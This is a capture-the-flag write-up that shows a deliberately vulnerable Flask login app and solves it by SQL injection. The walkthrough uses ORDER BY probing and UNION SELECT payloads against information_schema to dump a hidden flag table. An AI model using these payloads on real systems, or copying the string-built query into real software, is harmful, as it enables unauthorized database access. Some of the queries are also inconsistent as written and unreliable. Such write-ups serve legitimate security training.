## Description
```python
import os
from flask import Flask, request, render_template
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'secret_db')
mysql = MySQL(app)

@app.route("/", methods = ["GET", "POST"])
def index():

    if request.method == "POST":
        uid = request.form.get('uid', '')
        upw = request.form.get('upw', '')
        if uid and upw:
            cur = mysql.connection.cursor()
            cur.execute(f"SELECT * FROM users WHERE uid='{uid}' and upw='{upw}';")
            data = cur.fetchall()
            if data:
                return render_template("user.html", data=data)

            else: return render_template("index.html", data="Wrong!")

        return render_template("index.html", data="Fill the input box", pre=1)
    return render_template("index.html")


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```
It prints out account information when logging in

```sql
CREATE DATABASE secret_db;
GRANT ALL PRIVILEGES ON secret_db.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass';

USE `secret_db`;
CREATE TABLE users (
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null,
  descr varchar(128) not null
);

INSERT INTO users (uid, upw, descr) values ('admin', 'apple', 'For admin');
INSERT INTO users (uid, upw, descr) values ('guest', 'melon', 'For guest');
INSERT INTO users (uid, upw, descr) values ('banana', 'test', 'For banana');
FLUSH PRIVILEGES;

CREATE TABLE fake_table_name (
  idx int auto_increment primary key,
  fake_col1 varchar(128) not null,
  fake_col2 varchar(128) not null,
  fake_col3 varchar(128) not null,
  fake_col4 varchar(128) not null
);

INSERT INTO fake_table_name (fake_col1, fake_col2, fake_col3, fake_col4) values ('flag is ', 'DH{sam','ple','flag}');
```
We don't know another table and column name that have flag information.  

## Vulnerability
SQL Injection  
We can inject SQL query, because they use user's input into query, not data.  

## Exploit
1. We should use UNION SELECT for printing out flag in the other table.  
   But, we don't know that table and column name, so we can get that name by using information_schema  
   Before that, we should know number of columns of user info query, for using UNION SELECT.  
   ```
   admin' ORDER BY 1-- -
   admin' ORDER BY 2-- -
   admin' ORDER BY 3-- -
   admin' ORDER BY 4-- -
   admin' ORDER BY 5-- -(Error!)
   ```
   So we can know the column of query is 4.
2. And we should know table and column name  
   ```
   admin' UNION SELECT table_name, NULL, NULL, NULL FROM information_schema.tables WHERE table_type='base table'; -- -
   ```
   <img width="687" height="179" alt="image" src="https://github.com/user-attachments/assets/31467bae-94a6-4a57-b467-7f59d45ce3be" />
   We know about the table name is onlyflag.  
   ```
   admin' UNION SELECT column_name, NULL, NULL, NULL FROM information_schema.columns WHERE table_type='base table'; -- -
   ```
   <img width="652" height="377" alt="image" src="https://github.com/user-attachments/assets/e1e196ab-9a6b-4b81-af80-cd9b65091ed8" />
3. Now, we know that onlyflag table has 5 columns.  
   So we can use that.  
   ```
   admin' UNION SELECT sname, svalue, sflag, sclose FROM onlyflag; -- -
   ```
   <img width="744" height="110" alt="image" src="https://github.com/user-attachments/assets/94ad6859-a1dc-41cd-90e5-daa6f44e98d1" />

   we can get a part of the whole flag, because the server only showed 1st, 2nd, 4th data.  
   So we should switch the places.  
   ```
   admin' UNION SELECT sname, svalue, sclose, sflag FROM onlyflag; --
   ```
   <img width="755" height="121" alt="image" src="https://github.com/user-attachments/assets/4db3357c-8548-4d53-ac10-1cde8925ce9e" />
   Then, we can get a part of the flag.  
